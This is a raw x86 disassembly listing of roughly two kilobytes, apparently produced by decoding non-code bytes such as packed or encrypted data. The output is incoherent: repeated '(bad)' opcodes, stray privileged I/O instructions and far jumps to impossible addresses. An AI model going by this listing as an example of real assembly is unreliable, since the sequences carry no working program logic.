  4163a0:	mov    eax,0x83130809
  4163a5:	mov    esi,DWORD PTR [edx-0x31bc5190]
  4163ab:	enter  0x9e58,0xa9
  4163af:	dec    ebp
  4163b0:	add    ebx,DWORD PTR [ebx+0x71958cbd]
  4163b6:	retf   0x3779
  4163b9:	aas    
  4163ba:	retf   0x5824
  4163bd:	mov    edi,ebp
  4163bf:	lahf   
  4163c0:	dec    ebp
  4163c1:	or     bh,BYTE PTR ds:0xb755bcd4
  4163c7:	(bad)  
  4163c9:	add    ebx,esp
  4163cb:	mov    esi,0x1488c589
  4163d0:	sti    
  4163d1:	dec    ebx
  4163d2:	push   ecx
  4163d3:	shl    DWORD PTR [ebx+edi*2-0x47],0xc8
  4163d8:	sbb    DWORD PTR [edx-0x6e],0x74885501
  4163df:	mov    cl,0x40
  4163e1:	repnz adc bh,bl
  4163e4:	addr16 jmp 0xc4d63cc2
  4163ea:	repz or bh,BYTE PTR [edi+ebp*8]
  4163ee:	test   al,0x26
  4163f0:	inc    ecx
  4163f1:	stos   BYTE PTR es:[edi],al
  4163f2:	fcomp  QWORD PTR [esi+0x18]
  4163f5:	lea    eax,fs:[eax]
  4163f8:	jmp    0xa487c62b
  4163fd:	push   ebp
  4163fe:	es mov dl,0x39
  416401:	test   ah,0x4c
  416404:	mov    edi,DWORD PTR [eax]
  416406:	and    al,0x3
  416408:	inc    ecx
  416409:	daa    
  41640a:	lods   eax,DWORD PTR ds:[esi]
  41640b:	mov    dh,0xbb
  41640d:	das    
  41640e:	shr    BYTE PTR [esi-0x3775ccf5],0x40
  416415:	mov    WORD PTR [ebx-0x69],ds
  416418:	scas   al,BYTE PTR es:[edi]
  416419:	push   DWORD PTR ds:[edi-0x1432de42]
  416420:	xchg   edi,eax
  416421:	cmc    
  416422:	arpl   WORD PTR [eax+0x12],dx
  416425:	ins    BYTE PTR es:[edi],dx
  416426:	push   edi
  416427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416428:	dec    eax
  416429:	(bad)  
  41642a:	xor    edi,DWORD PTR [ebx]
  41642c:	or     al,0x15
  41642e:	mov    eax,0x5a8e34c7
  416433:	dec    edi
  416434:	or     DWORD PTR [edi-0x35],ebx
  416437:	ret    0x58c7
  41643a:	or     al,0xa4
  41643c:	aam    0x9f
  41643e:	mov    DWORD PTR [eax+0xd7586b2],esi
  416444:	inc    edx
  416445:	add    DWORD PTR [ebp+eiz*8-0x29a25446],0x465b4db1
  416450:	cmp    esi,DWORD PTR [ebx]
  416452:	test   al,0xff
  416454:	out    0xd7,al
  416456:	cs or  eax,0x7fd5616a
  41645c:	imul   ebx,DWORD PTR [ecx],0x13339550
  416462:	icebp  
  416463:	outs   dx,DWORD PTR ds:[esi]
  416464:	iret   
  416465:	cmp    al,0x87
  416467:	adc    cl,0x56
  41646a:	imul   edi,DWORD PTR [ebx],0xdeb12436
  416470:	jnp    0x41642e
  416472:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416473:	mov    bh,0x7a
  416475:	pop    esi
  416476:	(bad)  
  416477:	xchg   esi,eax
  416478:	push   cs
  416479:	pop    esi
  41647a:	dec    esp
  41647b:	mov    bl,0xee
  41647d:	xchg   ecx,eax
  41647e:	jne    0x416456
  416480:	mov    bh,BYTE PTR [ebp+0x41]
  416483:	or     al,0x31
  416485:	out    dx,al
  416486:	ds pushf 
  416488:	dec    ebp
  416489:	ds ja  0x41642e
  41648c:	mov    ebp,0x3697777d
  416491:	das    
  416492:	inc    eax
  416493:	push   ds
  416494:	xchg   edx,eax
  416495:	sbb    DWORD PTR [esi-0x25],esp
  416498:	inc    edx
  416499:	adc    bl,BYTE PTR [ecx+esi*1]
  41649c:	into   
  41649d:	js     0x4164f2
  41649f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164a0:	iret   
  4164a1:	lahf   
  4164a2:	lods   eax,DWORD PTR ds:[esi]
  4164a3:	xlat   BYTE PTR cs:[ebx]
  4164a5:	dec    esp
  4164a6:	mov    WORD PTR ds:0x2fb1c226,?
  4164ac:	jns    0x416441
  4164ae:	int3   
  4164af:	out    0x24,eax
  4164b1:	ds sbb al,0x94
  4164b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164b5:	aas    
  4164b6:	fist   DWORD PTR [ebx-0x55]
  4164b9:	push   ecx
  4164ba:	sbb    BYTE PTR ds:0x2d969a63,ah
  4164c0:	sahf   
  4164c1:	loop   0x4164ec
  4164c3:	les    ecx,FWORD PTR [ecx+edx*2-0x4784f688]
  4164ca:	stc    
  4164cb:	icebp  
  4164cc:	xchg   BYTE PTR [ebx+0x1c84517e],al
  4164d2:	fdivr  DWORD PTR [esi+0x32a5df0a]
  4164d8:	outs   dx,BYTE PTR ds:[esi]
  4164d9:	pop    es
  4164da:	inc    ebx
  4164db:	fadd   QWORD PTR [ecx+0x1190227b]
  4164e1:	mov    ds:0x3929fc25,eax
  4164e6:	ret    0x9633
  4164e9:	outs   dx,DWORD PTR ds:[esi]
  4164ea:	pop    ecx
  4164eb:	cmp    al,0xcf
  4164ed:	mov    es,WORD PTR [ecx-0x359b6a29]
  4164f3:	ror    DWORD PTR [edi-0x7f],1
  4164f6:	mov    ebp,0x5355b8ba
  4164fb:	mov    DWORD PTR [esi+0x5bb9f538],esp
  416501:	adc    esi,DWORD PTR [ecx*2-0x66829687]
  416508:	xchg   ebx,eax
  416509:	mov    ds,WORD PTR [esi-0x3]
  41650c:	hlt    
  41650d:	adc    BYTE PTR [edx+0x63cce958],al
  416513:	xlat   BYTE PTR ds:[ebx]
  416514:	mov    eax,DWORD PTR [eax+eax*8+0x728fe507]
  41651b:	cs push es
  41651d:	in     al,0x75
  41651f:	pusha  
  416520:	or     eax,0x60a3371c
  416525:	dec    edx
  416526:	repnz mov ds:0x9be5f5cb,eax
  41652c:	mov    esi,0xb2541d1f
  416531:	dec    edi
  416532:	mov    edi,0x49b2eab7
  416537:	sahf   
  416538:	push   es
  416539:	jmp    0x32122ad
  41653e:	out    0xf9,eax
  416540:	hlt    
  416541:	push   ebp
  416542:	mov    DWORD PTR [ebx],esi
  416544:	loopne 0x41652e
  416546:	mov    dl,0x2
  416548:	or     cl,BYTE PTR [edx-0x64d36971]
  41654e:	fucomi st,st(5)
  416550:	ins    DWORD PTR es:[edi],dx
  416551:	iret   
  416552:	(bad)  
  416553:	sbb    DWORD PTR [eax],esp
  416555:	pop    eax
  416556:	pop    edx
  416557:	mov    ds:0xf228b8af,al
  41655c:	push   ss
  41655d:	jmp    0x43f1ab24
  416562:	pop    edx
  416563:	inc    esi
  416564:	pushf  
  416565:	cmp    BYTE PTR [ebp+0x1d7fa42d],0x59
  41656c:	push   gs
  41656e:	jp     0x4165e2
  416570:	sar    bh,1
  416572:	fstp   TBYTE PTR [eax-0x32]
  416575:	outs   dx,DWORD PTR ds:[esi]
  416576:	fnstsw WORD PTR [ecx]
  416578:	fisttp DWORD PTR [edx]
  41657a:	push   cs
  41657b:	popa   
  41657c:	mov    cl,0xb
  41657e:	xchg   esp,eax
  41657f:	cmp    al,0x8f
  416581:	test   eax,0xfcf8ec06
  416586:	imul   BYTE PTR [ebx-0x6240414d]
  41658c:	sbb    edi,ebx
  41658e:	jb     0x416595
  416590:	inc    esp
  416591:	loope  0x4165f6
  416593:	repz xchg cl,ch
  416596:	test   DWORD PTR [edi-0x6f],0x9bd0f19c
  41659d:	inc    esp
  41659e:	stc    
  41659f:	inc    edi
  4165a0:	or     dl,BYTE PTR [ebp-0x2c]
  4165a3:	scas   eax,DWORD PTR es:[edi]
  4165a4:	cwde   
  4165a5:	xchg   esi,eax
  4165a6:	out    dx,eax
  4165a7:	mov    edi,esi
  4165a9:	and    BYTE PTR ds:0xb86b0a7e,bl
  4165af:	mov    es,WORD PTR [eax+0x47]
  4165b2:	in     al,dx
  4165b3:	sub    dh,BYTE PTR [esi+0x5f]
  4165b6:	inc    ebx
  4165b7:	xchg   BYTE PTR [ebp+0x382f7d2c],bh
  4165bd:	mov    dh,BYTE PTR [eax-0x11]
  4165c0:	mov    eax,0xb0118980
  4165c5:	lock stc 
  4165c7:	mov    dh,0xfa
  4165c9:	add    DWORD PTR [ebx+0x18],ecx
  4165cc:	mov    cs,edi
  4165ce:	mov    ds,WORD PTR [esi+0x4f]
  4165d1:	into   
  4165d2:	sbb    edi,esi
  4165d4:	sbb    DWORD PTR [eax-0x76],edi
  4165d7:	mov    ?,WORD PTR [esi+0x72ee2b4d]
  4165dd:	pop    ebp
  4165de:	leave  
  4165df:	lods   al,BYTE PTR ds:[esi]
  4165e0:	int3   
  4165e1:	or     DWORD PTR [ebx+esi*1+0x1ff58361],ebp
  4165e8:	and    DWORD PTR [edx],esi
  4165ea:	mov    esi,0xa70163fb
  4165ef:	mov    ebp,0x870f64b0
  4165f4:	call   0x7e601830
  4165f9:	push   0xf9e09eac
  4165fe:	sbb    al,0x54
  416600:	scas   al,BYTE PTR es:[edi]
  416601:	mov    ss,WORD PTR [eax]
  416603:	sahf   
  416604:	scas   eax,DWORD PTR es:[edi]
  416605:	cli    
  416606:	xchg   edi,eax
  416607:	test   eax,0x5532ec2d
  41660c:	add    ch,BYTE PTR [esi+ecx*8]
  41660f:	je     0x416678
  416611:	mov    eax,ds:0x3cef2979
  416616:	push   ebp
  416617:	popf   
  416618:	mov    cl,0xf3
  41661a:	push   ds
  41661b:	pop    ebp
  41661c:	jmp    0xe235:0x52af9b1d
  416623:	adc    esi,DWORD PTR [esi]
  416625:	fwait
  416626:	xchg   ebp,eax
  416627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416628:	jmp    0x7c5:0xe6c957c7
  41662f:	pop    esp
  416630:	add    cl,BYTE PTR [ecx]
  416632:	in     al,dx
  416633:	popa   
  416634:	jecxz  0x416634
  416636:	mov    ss,WORD PTR [ebp+0x6f]
  416639:	mov    ecx,0x6b94fcd7
  41663e:	outs   dx,DWORD PTR ds:[esi]
  41663f:	push   esp
  416640:	dec    ebp
  416641:	repz ret 0xa4d2
  416645:	add    BYTE PTR [ebp-0x5b],bh
  416648:	es xchg esi,eax
  41664a:	mov    BYTE PTR [ebp-0x5514eec5],al
  416650:	jmp    0x602335f
  416655:	mov    al,ds:0xe89e570b
  41665a:	push   0x9898b86f
  41665f:	fs and esi,eax
  416662:	add    bl,BYTE PTR [ecx]
  416664:	xchg   edi,eax
  416665:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  416667:	ret    
  416668:	fldl2e 
  41666a:	pop    es
  41666b:	dec    ebp
  41666c:	sbb    eax,0xebc9ff2a
  416671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416672:	call   0x41bf:0x544c9a41
  416679:	repnz add esi,DWORD PTR [esi-0x74]
  41667d:	mov    al,0x24
  41667f:	aam    0xc9
  416681:	pushf  
  416682:	sahf   
  416683:	push   ebx
  416684:	(bad)  
  416687:	cmp    esp,DWORD PTR [esi]
  416689:	xor    BYTE PTR [eax+0x1e6b2323],0xd7
  416690:	sbb    eax,0xb7d9563a
  416695:	sbb    dl,BYTE PTR [esi-0x4c]
  416698:	adc    esp,DWORD PTR [edx+0x6d]
  41669b:	dec    edx
  41669c:	jbe    0x416700
  41669e:	add    DWORD PTR [edi+ecx*1],esi
  4166a1:	sbb    DWORD PTR [edi-0x36],ebp
  4166a4:	pop    edi
  4166a5:	add    cl,BYTE PTR [eax-0x688bb3df]
  4166ab:	or     eax,0xb6c7e030
  4166b0:	or     BYTE PTR [ebp-0x164bca9c],dh
  4166b6:	test   DWORD PTR [ebp-0x69],ebp
  4166b9:	cli    
  4166ba:	les    ebp,FWORD PTR [edi]
  4166bc:	xor    al,0x7a
  4166be:	mov    ecx,edi
  4166c0:	loopne 0x416716
  4166c2:	enter  0x277,0xe5
  4166c6:	mov    dh,0x2b
  4166c8:	mov    esp,0x63383601
  4166cd:	mov    gs,WORD PTR [edx+edi*2+0x538e756f]
  4166d4:	inc    eax
  4166d5:	jmp    0x41672c
  4166d7:	mov    fs,esp
  4166d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166da:	mov    DWORD PTR [ebx],edx
  4166dc:	ja     0x41667d
  4166de:	xchg   esp,eax
  4166df:	add    esi,DWORD PTR [ebx]
  4166e1:	sub    al,0xb4
  4166e3:	mov    ds:0xd5670a65,eax
  4166e8:	push   edi
  4166e9:	and    eax,0xebf4ad81
  4166ee:	sbb    al,0x76
  4166f0:	jmp    0xe2e725c9
  4166f5:	push   ebx
  4166f6:	sbb    cl,BYTE PTR [edi]
  4166f8:	fs popa 
  4166fa:	add    al,cl
  4166fc:	in     al,0xf
  4166fe:	add    edi,DWORD PTR [esi+0x1]
  416701:	pop    eax
  416702:	jne    0x416780
  416704:	jg     0x4166d2
  416706:	mov    ah,0xcb
  416708:	mov    fs,ebp
  41670a:	(bad)  
  41670b:	stc    
  41670c:	cmp    al,0x6e
  41670e:	inc    edx
  41670f:	out    0xac,eax
  416711:	sbb    al,0xd6
  416713:	bound  ecx,QWORD PTR [ebx+eiz*4]
  416716:	add    ebp,esp
  416718:	aas    
  416719:	push   0x33033faa
  41671e:	bound  esi,QWORD PTR [esi+edx*2]
  416721:	dec    edi
  416722:	xchg   esi,eax
  416723:	cmp    eax,0x47544a45
  416728:	pop    ebp
  416729:	lods   eax,DWORD PTR ds:[esi]
  41672a:	lahf   
  41672b:	sbb    eax,0x58570620
  416730:	je     0x41677d
  416732:	and    al,0xd0
  416734:	mov    al,ds:0xba311736
  416739:	(bad)
  41673c:	mov    al,ds:0x5455dbe
  416741:	push   esi
  416742:	(bad)  
  416743:	pusha  
  416744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416745:	mov    ch,0xe9
  416747:	jne    0x416725
  416749:	mov    dh,0x40
  41674b:	cdq    
  41674c:	xor    eax,0x887a22bf
  416751:	cld    
  416752:	mov    ch,0x6b
  416754:	aam    0x7
  416756:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416757:	out    dx,al
  416758:	rcr    BYTE PTR [esi-0x1bcda62d],cl
  41675e:	jmp    0x4092:0xa9cf458d
  416765:	mov    cl,0x95
  416767:	mov    al,ds:0x428128f7
  41676c:	dec    DWORD PTR [esi-0x61]
  41676f:	dec    edi
  416770:	retf   
  416771:	enter  0xd563,0x82
  416775:	dec    edi
  416776:	push   eax
  416777:	nop
  416778:	icebp  
  416779:	call   0xa4b5c61c
  41677e:	loope  0x416762
  416780:	and    bh,BYTE PTR [ebx+0x6a1833fd]
  416786:	out    dx,al
  416787:	test   BYTE PTR [ebx],bh
  416789:	mov    dl,0x8f
  41678b:	outs   dx,DWORD PTR ds:[esi]
  41678c:	mov    al,ds:0x8539484a
  416791:	push   ebx
  416792:	cs jae 0x416802
  416795:	pop    edx
  416796:	stc    
  416797:	jle    0x416762
  416799:	(bad)  
  41679a:	jge    0x41678b
  41679c:	pop    eax
  41679d:	jmp    0xa51f:0xac66f34d
  4167a4:	jecxz  0x4167a5
  4167a6:	mov    dh,0xe9
  4167a8:	xchg   esp,eax
  4167a9:	pop    ecx
  4167aa:	jmp    0x41675b
  4167ac:	push   edi
  4167ad:	push   edx
  4167ae:	push   ebp
  4167af:	ret    
  4167b0:	int    0x28
  4167b2:	mov    DWORD PTR [ebp-0x41804959],edi
  4167b8:	push   edi
  4167b9:	mov    WORD PTR [ebp-0x47],ds
  4167bc:	not    BYTE PTR [edi+0x5774cd64]
  4167c2:	repnz fistp DWORD PTR [eax-0x43]
  4167c6:	outs   dx,BYTE PTR ds:[esi]
  4167c7:	aam    0x5d
  4167c9:	adc    ecx,DWORD PTR [esi]
  4167cb:	addr16 add eax,0xd6f2e7c3
  4167d1:	pushf  
  4167d2:	sbb    eax,0x4fdab2b
  4167d7:	gs mov ah,0x46
  4167da:	mov    edx,0xf8013095
  4167df:	sbb    eax,0xdefca671
  4167e4:	dec    eax
  4167e5:	push   cs
  4167e6:	pop    eax
  4167e7:	sahf   
  4167e8:	mov    edi,0xf6fb207f
  4167ed:	xchg   ebx,eax
  4167ee:	mov    dh,0x19
  4167f0:	daa    
  4167f1:	in     al,0xef
  4167f3:	add    ecx,DWORD PTR [eax-0x55eb81a3]
  4167f9:	adc    BYTE PTR [eax+eiz*1+0x59a43d34],bl
  416800:	adc    dl,BYTE PTR [ecx+0x5d]
  416803:	fnstcw WORD PTR [ebx]
  416805:	dec    esp
  416806:	in     eax,0x16
  416808:	test   eax,0xecc4d559
  41680d:	xchg   edx,eax
  41680f:	dec    edi
  416810:	xor    DWORD PTR [ebx],edx
  416812:	sbb    al,0x39
  416814:	cmp    ah,0xb1
  416817:	cs cmp eax,0x200f2a69
  41681d:	cwde   
  41681e:	mov    ?,ebx
  416820:	or     ch,BYTE PTR [ecx+0x6a]
  416823:	adc    esp,ebp
  416825:	js     0x41689c
  416827:	jo     0x416810
  416829:	ficom  WORD PTR [edx]
  41682b:	mov    BYTE PTR ds:0x83bc22b4,bh
  416831:	ins    BYTE PTR es:[edi],dx
  416832:	jne    0x4167f6
  416834:	jle    0x416876
  416836:	fistp  QWORD PTR [ecx]
  416838:	imul   esp,DWORD PTR [eax],0xc1e695ea
  41683e:	cli    
  41683f:	inc    eax
  416840:	add    al,0xca
  416842:	loope  0x4168b2
  416844:	mov    ah,0xeb
  416846:	sbb    eax,0xa9bcd082
  41684b:	jbe    0x41680a
  41684d:	aad    0x27
  41684f:	xchg   DWORD PTR [edx],edi
  416851:	pop    eax
  416852:	cmp    BYTE PTR [eax-0x30ddd91c],0xe0
  416859:	mov    esi,0x80ab5214
  41685e:	icebp  
  41685f:	inc    esi
  416860:	push   edi
  416861:	(bad)  
  416862:	sbb    bh,dh
  416864:	sbb    BYTE PTR [esi-0x8875005],bl
  41686a:	or     DWORD PTR [eax*1-0x6fd5eae8],ebx
  416871:	test   DWORD PTR fs:[ecx-0x57],eax
  416875:	int    0x65
  416877:	jge    0x4168f3
  416879:	or     al,0x64
  41687b:	fisttp DWORD PTR [edi+0xc]
  41687e:	test   eax,0x98ce8eb9
  416883:	or     esi,esp
  416885:	or     ebp,ecx
  416887:	dec    ebp
  416888:	(bad)  
  416889:	jb     0x4168c9
  41688b:	repz xor DWORD PTR [ebp+0x4b2e9502],edi
  416892:	inc    esi
  416893:	push   ss
  416894:	shr    DWORD PTR [ebp+esi*4+0x79cb423b],1
  41689b:	push   es
  41689c:	xchg   esi,eax
  41689d:	xchg   edi,eax
  41689e:	xor    dl,bl
  4168a0:	sbb    DWORD PTR [esi-0x63eb8530],0xffffffa5
  4168a7:	dec    ebx
  4168a8:	add    ebx,DWORD PTR ds:0x7b7b8924
  4168ae:	retf   
  4168af:	inc    eax
  4168b0:	adc    al,0xc0
  4168b2:	sub    eax,0xe9072af7
  4168b7:	or     BYTE PTR [eax+ebx*8-0x19],ch
  4168bb:	pop    ebp
  4168bc:	mov    edi,0x61c42e6b
  4168c1:	dec    esi
  4168c2:	or     ebp,ebp
  4168c4:	aad    0x95
  4168c6:	dec    edi
  4168c7:	iret   
  4168c8:	mov    edx,0x4571bf23
  4168cd:	mov    dh,0x4b
  4168cf:	cmp    dh,BYTE PTR [ebx+0x4e39bc78]
  4168d5:	scas   al,BYTE PTR es:[edi]
  4168d6:	xor    ax,0xc479
  4168da:	mov    ah,BYTE PTR [edx+0x2]
  4168dd:	retf   0x138a
  4168e0:	fwait
  4168e1:	loop   0x416900
  4168e3:	add    eax,0x34f525e1
  4168e8:	jo     0x416946
  4168ea:	inc    edx
  4168eb:	mov    esp,0xc55b417a
  4168f0:	aas    
  4168f1:	cwde   
  4168f2:	les    esi,FWORD PTR [ebx+edx*1+0x55aa8e22]
  4168f9:	xchg   cx,ax
  4168fb:	gs cmp edi,0x19
  4168ff:	or     dl,BYTE PTR [ebx]
  416901:	call   0xc6f4fe93
  416906:	fisub  WORD PTR [ecx-0x1bdba6ea]
  41690c:	jnp    0x4168dc
  41690e:	pop    edi
  41690f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416910:	std    
  416911:	stos   DWORD PTR es:[edi],eax
  416912:	subps  xmm2,XMMWORD PTR [ebx-0x22]
  416916:	lea    esi,[edi+ebx*2-0x44]
  41691a:	aam    0xc1
  41691c:	xchg   edi,eax
  41691d:	fsub   st(7),st
  41691f:	cwde   
  416920:	mov    cl,BYTE PTR [ebx-0x1]
  416923:	cmc    
  416924:	aad    0xf8
  416926:	stc    
  416927:	mov    ds:0x59c1c586,al
  41692c:	sub    esi,DWORD PTR [ebx-0x1f]
  41692f:	out    0xe5,eax
  416931:	sub    cl,BYTE PTR [edx]
  416933:	add    eax,0x21b9c6e2
  416938:	repnz mov ebp,0xceb7de20
  41693e:	leave  
  41693f:	inc    eax
  416940:	sub    al,0xb8
  416942:	xchg   esi,eax
  416943:	pop    edi
  416944:	lds    edx,FWORD PTR [eax]
  416946:	scas   eax,DWORD PTR es:[edi]
  416947:	cmp    ecx,ebx
  416949:	imul   DWORD PTR [edi+0x1d8c9734]
  41694f:	and    DWORD PTR [esi-0x64],0x1c
  416953:	mov    cl,0xa4
  416955:	ins    DWORD PTR es:[edi],dx
  416956:	push   edi
  416957:	mov    ecx,DWORD PTR [edx-0x1e]
  41695a:	push   ss
  41695b:	inc    eax
  41695c:	outs   dx,DWORD PTR es:[esi]
  41695e:	retf   
  41695f:	(bad)  
  416960:	std    
  416961:	sub    cl,cl
  416963:	stc    
  416964:	inc    edi
  416965:	addr16 cdq 
  416967:	sub    edx,eax
  416969:	cwde   
  41696a:	xchg   ebx,eax
  41696b:	push   ebp
  41696c:	or     BYTE PTR [edx-0x6e],0x1a
  416970:	push   esi
  416971:	scas   al,BYTE PTR es:[edi]
  416972:	xor    bl,bl
  416974:	adc    al,0xaf
  416976:	push   cs
  416977:	or     BYTE PTR [ebp+0x4097aeb3],ch
  41697d:	adc    DWORD PTR [ecx+ecx*1+0x14b7dd84],esp
  416984:	pop    esi
  416985:	sub    eax,DWORD PTR [edi-0x47]
  416988:	out    dx,al
  416989:	das    
  41698a:	add    bh,BYTE PTR [esi]
  41698c:	mov    dh,0x60
  41698e:	mov    edx,0xc261740a
  416993:	jb     0x416999
  416995:	icebp  
  416996:	call   DWORD PTR [esi+edi*8-0x49]
  41699a:	aaa    
  41699b:	sbb    al,0xf4
  41699d:	push   esp
  41699e:	dec    ecx
  41699f:	add    al,0xd9
  4169a1:	xchg   edx,eax
  4169a2:	jns    0x4169a9
  4169a4:	test   BYTE PTR [eax-0x70],dl
  4169a7:	nop
  4169a8:	outs   dx,DWORD PTR ds:[esi]
  4169a9:	mov    ebx,0xa05db4e3
  4169ae:	xor    ecx,DWORD PTR [ebx+eax*4]
  4169b1:	addr16 xor al,0x96
  4169b4:	mov    edx,0x78a63843
  4169b9:	je     0x41693d
  4169bb:	inc    eax
  4169bc:	fmulp  st(0),st
  4169be:	outs   dx,BYTE PTR ds:[esi]
  4169bf:	shl    BYTE PTR [edi-0x76d74e55],1
  4169c5:	fisttp QWORD PTR [edi-0x21f6f251]
  4169cb:	je     0x41698a
  4169cd:	inc    esp
  4169ce:	fptan  
  4169d0:	and    DWORD PTR cs:[ecx],edx
  4169d3:	ds mov bl,0x4f
  4169d6:	dec    esi
  4169d7:	icebp  
  4169d8:	push   es
  4169d9:	jp     0x4169ca
  4169db:	push   cs
  4169dc:	or     BYTE PTR [ecx],dh
  4169de:	ret    0xf068
  4169e1:	(bad)  
  4169e2:	fadd   DWORD PTR [esi]
  4169e4:	std    
  4169e5:	xchg   edx,eax
  4169e6:	outs   dx,DWORD PTR ds:[esi]
  4169e7:	push   ecx
  4169e8:	push   esi
  4169e9:	dec    eax
  4169ea:	int3   
  4169eb:	cdq    
  4169ec:	fbstp  TBYTE PTR [ebx+0x59a3f764]
  4169f2:	jnp    0x416a26
  4169f4:	sub    dl,0x23
  4169f7:	inc    esp
  4169f8:	cmp    DWORD PTR [ebx+0x5521fd56],0xf928bb3a
  416a02:	sbb    DWORD PTR [edx+0x78],edx
  416a05:	icebp  
  416a06:	pop    ebp
  416a07:	dec    ecx
  416a08:	lock cmp BYTE PTR [bp+si],al
  416a0c:	mov    ch,0x61
  416a0e:	and    esi,ebx
  416a10:	push   eax
  416a11:	inc    eax
  416a12:	mov    ebx,0x7522cc24
  416a17:	lock mov al,ds:0xa7df0e9e
  416a1d:	lea    ecx,[esi+eiz*8+0x2b]
  416a21:	lods   al,BYTE PTR ds:[esi]
  416a22:	mov    ebx,0xa6844f17
  416a27:	aas    
  416a28:	scas   eax,DWORD PTR es:[edi]
  416a29:	cmp    esp,edx
  416a2b:	daa    
  416a2c:	cli    
  416a2d:	jmp    0xffc2e99d
  416a32:	push   esp
  416a33:	add    DWORD PTR [ecx],eax
  416a35:	xor    eax,0x624ce131
  416a3a:	stos   BYTE PTR es:[edi],al
  416a3b:	mov    ebp,0x4b5741e3
  416a40:	jbe    0x4169f5
  416a42:	push   edx
  416a43:	daa    
  416a44:	popa   
  416a45:	gs sbb dl,ah
  416a48:	or     eax,0x1041d657
  416a4d:	xchg   edi,eax
  416a4e:	sub    ah,BYTE PTR [ecx-0x4db371fb]
  416a54:	cmp    eax,0xd21f7926
  416a59:	mov    eax,0xeb0c19d1
  416a5e:	xchg   esi,eax
  416a5f:	sub    ecx,DWORD PTR [edx+0x68]
  416a62:	das    
  416a63:	out    0xe7,al
  416a65:	sti    
  416a66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a67:	test   eax,0xfa7cf5ff
  416a6c:	gs mov esi,0xfe34527e
  416a72:	retf   
  416a73:	jnp    0x416a06
  416a75:	loope  0x416a6b
  416a77:	add    ebx,DWORD PTR [edi-0x75631b74]
  416a7d:	xor    eax,0xe2a5fb72
  416a82:	or     eax,0x5279cb2a
  416a87:	std    
  416a88:	ds xchg ebp,eax
  416a8a:	mov    BYTE PTR [edi+0x67cbc576],dl
  416a90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a91:	sahf   
  416a92:	adc    eax,0xa3a3f2f9
  416a97:	loope  0x416a62
  416a99:	mov    eax,ds:0x166cc87b
  416a9e:	addr16 ret 0x66be
  416aa2:	mov    ecx,0x37f5fd70
  416aa7:	xor    ecx,ebx
  416aa9:	adc    al,0x29
  416aab:	or     eax,0xb3f32c4e
  416ab0:	pushf  
  416ab1:	xchg   BYTE PTR [ebp+0x7e8a05fa],dh
  416ab7:	cli    
  416ab8:	cmp    ebp,DWORD PTR ds:0xeb7a2735
  416abe:	add    BYTE PTR [eax],dl
  416ac0:	fild   QWORD PTR [edi+0x414c2ec2]
  416ac6:	mov    edi,es
  416ac8:	outs   dx,DWORD PTR ds:[esi]
  416ac9:	std    
  416aca:	add    ch,dl
  416acc:	int    0x20
  416ace:	or     eax,0xd2d4213
  416ad3:	cs cwde 
  416ad5:	pop    ebx
  416ad6:	pop    ecx
  416ad7:	in     eax,0x59
  416ad9:	(bad)  [ebp+0x529bdf10]
  416adf:	in     eax,dx
  416ae0:	mov    al,0xba
  416ae2:	lods   al,BYTE PTR ds:[esi]
  416ae3:	push   edi
  416ae4:	(bad)
  416ae7:	push   esi
  416ae8:	enter  0x60bc,0x92
  416aec:	(bad)  
  416aed:	and    esi,DWORD PTR [ebp-0x72]
  416af0:	pop    ebx
  416af1:	sbb    cl,BYTE PTR [edi+0x11c9e682]
  416af7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416af8:	test   al,0xbc
  416afa:	mov    eax,0x53e02912
  416aff:	push   0x57
  416b01:	aad    0xf7
  416b03:	push   es
  416b04:	lea    eax,[edx-0xe]
  416b07:	mov    eax,0x1d461c5d
  416b0c:	lock xor bl,bh
  416b0f:	in     al,dx
  416b10:	ins    DWORD PTR es:[edi],dx
  416b11:	mov    eax,ds:0x14e9534b
  416b16:	aaa    
  416b17:	test   BYTE PTR [edi+0x64],al
  416b1a:	push   esi
  416b1b:	mov    dl,0x83
  416b1d:	rcr    BYTE PTR [esi],1
  416b1f:	pop    esp
  416b20:	fisubr WORD PTR [ecx-0x418dfb2c]
  416b26:	(bad)  
  416b27:	and    esi,esp
  416b29:	mov    eax,0x51133fce
  416b2e:	xchg   esp,eax
  416b2f:	jae    0x416b1d
  416b31:	es push ebp
  416b33:	call   0xe685:0x4f1d422
  416b3a:	hlt    
  416b3b:	and    eax,0x11ed1604
  416b40:	and    DWORD PTR [edx-0x2e],eax
  416b43:	gs inc ebp
  416b45:	sub    eax,0xbce1b111
  416b4a:	push   ds
  416b4b:	inc    ebx
  416b4c:	cmp    ecx,DWORD PTR [esi+eiz*1]
  416b4f:	add    BYTE PTR [eax],cl
  416b51:	lds    edi,FWORD PTR [ebx]
  416b53:	lahf   
  416b54:	sahf   
  416b55:	inc    esp
  416b56:	sar    DWORD PTR [edx-0x21],cl
  416b59:	out    dx,al
  416b5a:	aad    0xd8
  416b5c:	sub    DWORD PTR [esi+0x4c],0x7
  416b60:	mov    cl,0xb6
  416b62:	repnz enter 0x7a21,0x47
  416b67:	aaa    
  416b68:	mov    edi,0x78731fb3
  416b6d:	mov    eax,ds:0x2596b3de
  416b72:	js     0x416b36
  416b74:	ficom  WORD PTR [eax]
  416b76:	inc    ecx
  416b77:	pusha  
  416b78:	mov    eax,0xe25df712
  416b7d:	add    DWORD PTR [edx+0x2c16bb39],esp
  416b83:	mov    dl,0xc0
  416b85:	mov    esp,0xc5ef98fc
  416b8a:	xor    edx,DWORD PTR [esi-0x52230c2c]
  416b90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b91:	add    ebp,DWORD PTR [edx]
  416b93:	add    BYTE PTR [ebx+0x47],dh
  416b96:	lock sar BYTE PTR [eax],1
  416b99:	xchg   ecx,eax
  416b9a:	xchg   edi,eax
